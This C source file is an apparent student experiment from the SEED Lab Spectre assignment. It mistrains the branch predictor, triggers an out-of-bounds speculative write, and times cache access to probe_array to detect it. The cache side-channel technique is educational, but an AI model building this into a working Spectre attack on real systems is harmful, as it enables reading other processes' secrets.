/*
	Syracuse SEED Lab	
	http://www.cis.syr.edu/~wedu/seed/Labs_16.04/System/Spectre_Attack/Spectre_Attack.pdf	
*/

#include <stdio.h>
#include <stdint.h>
#include <emmintrin.h> // _mm_clflush__()
#include <x86intrin.h> // __rdtscp()

#define ARRAY_SIZE 256 // number of possible byte values
#define PAGE_SIZE 4096 // elements in probe_array should be PAGE_SIZE bytes apart to ensure they occupy different cache lines
#define DELTA 1024
#define CACHE_HIT_PREFETCH_THRESHOLD 150

uint8_t probe_array[ARRAY_SIZE * PAGE_SIZE + DELTA];
uint8_t temp = 0;
int size = 10;

void flush() {
	for(int i=0; i<ARRAY_SIZE; i++) {
		_mm_clflush(&probe_array[i * PAGE_SIZE + DELTA]); // removes from all cache hierarchies
	}
}

// https://github.com/IAIK/flush_flush/blob/master/sc/cacheutils.h
uint64_t rdtsc() {
	uint64_t a, d;
	asm volatile ("mfence");
	asm volatile ("rdtsc" : "=a" (a), "=d" (d));
	a = (d<<32) | a;
	asm volatile ("mfence");
	return a;
}

void clflush(void* p) {
	asm volatile ("clflush 0(%0)\n"
	  :
	  : "c" (p)
	  : "rax");
}

void victim(int idx) {
	if(idx < size) {
		//temp = probe_array[idx * PAGE_SIZE + DELTA];
		probe_array[idx * PAGE_SIZE + DELTA] = 1;
	}
}

int main(int argc, char* argv[]) {
	
	register uint64_t start, total_cycles; // cycle timestamps
	//volatile uint8_t* addr; // pointer to a byte	
	uint8_t* addr; // pointer to a byte	
	//unsigned int junk = 0;

	// initialize probe_array ; need this step to see timing differences for some reason... porque?
	for(int i=0; i<ARRAY_SIZE; i++) {
		probe_array[i * PAGE_SIZE + DELTA] = 1;
	}
	
	flush();
	
	// train the branch predictor to take the branch
	for(int i=0; i<10; i++) {
		_mm_clflush(&size);	// why is this flush needed...?
		victim(i);
	}	
	
	_mm_clflush(&size);	
	for(int i=0; i<ARRAY_SIZE; i++) {
		_mm_clflush(&probe_array[i * PAGE_SIZE + DELTA]); // removes from all cache hierarchies
	}

	// speculatively execute the taken branch, even if index is out of bounds	
	victim(17);

	// measure the clflush() instruction for each element
	for(int i=0; i<ARRAY_SIZE; i++) {
		addr = &probe_array[i * PAGE_SIZE + DELTA];
		start = rdtsc();
		//start = __rdtscp(&junk);
		//_mm_clflush(addr);	
		//clflush(addr);
		_mm_prefetch(addr, 2);
		//junk = *addr;	
		//total_cycles = __rdtscp(&junk) - start;
		total_cycles = rdtsc() - start;
		//if(total_cycles < CACHE_HIT_PREFETCH_THRESHOLD) guess = i;
		//if(total_cycles > CACHE_HIT_CLFLUSH1 && total_cycles < CACHE_HIT_CLFLUSH2) guess = i;
		printf("Access time probe_array[%i * %i + %i]: %d cycles\n", i, PAGE_SIZE, DELTA, (int)total_cycles);
	}
		
	return 0;
}
